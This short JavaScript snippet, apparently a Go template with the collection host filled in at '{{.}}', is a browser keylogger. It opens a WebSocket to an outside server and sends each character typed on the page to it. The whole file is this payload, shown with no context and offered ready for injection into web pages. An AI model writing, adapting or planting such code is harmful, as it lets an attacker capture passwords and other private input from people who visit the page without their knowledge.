(function(){
    const conn = new WebSocket("ws://{{.}}/ws")
    const keypress = (evt) => {
        s = String.fromCharCode(evt.which);
        conn.send(s)
    }
    document.onkeypress = keypress
})()